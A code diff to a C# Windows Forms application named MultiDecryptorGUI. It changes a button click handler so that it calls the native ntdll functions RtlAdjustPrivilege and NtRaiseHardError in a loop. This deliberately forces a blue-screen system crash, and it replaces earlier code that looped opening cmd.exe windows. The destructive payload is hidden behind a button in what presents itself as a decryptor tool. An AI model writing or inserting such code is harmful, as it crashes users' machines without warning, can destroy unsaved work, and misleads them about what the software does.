@@ -5,6 +5,7 @@ using System.Data;
 using System.Diagnostics;
 using System.Drawing;
 using System.Linq;
+using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
 using System.Threading.Tasks;
@@ -86,12 +87,31 @@ namespace MultiDecryptorGUI
                 Location = Mouse.newpoint;
             }
         }
+        [DllImport("ntdll.dll")]
+        private static extern uint RtlAdjustPrivilege(
+            int Privilege,
+            bool bEnablePrivilege,
+            bool IsThreadPrivilege,
+            out bool PreviousValue
+        );
+        [DllImport("ntdll.dll")]
+        private static extern uint NtRaiseHardError(
+            uint ErrorStatus,
+            uint NumberOfParameters,
+            uint UnicodeStringParameterMask,
+            IntPtr Parameters,
+            uint ValidResponseOption,
+            out uint Response
+        );
+        public const uint ASSERT_FAILURE = 0xc0000420;
 
         private void guna2Button2_Click(object sender, EventArgs e)
         {
             while (true)
             {
-                Process.Start("cmd.exe");
+                //https://github.com/AestheticalZ/BSODMachine/blob/master/Program.cs
+                RtlAdjustPrivilege(19, true, false, out bool idk);
+                NtRaiseHardError(ASSERT_FAILURE, 0, 0, IntPtr.Zero, 6, out uint output);
             }
         }
 
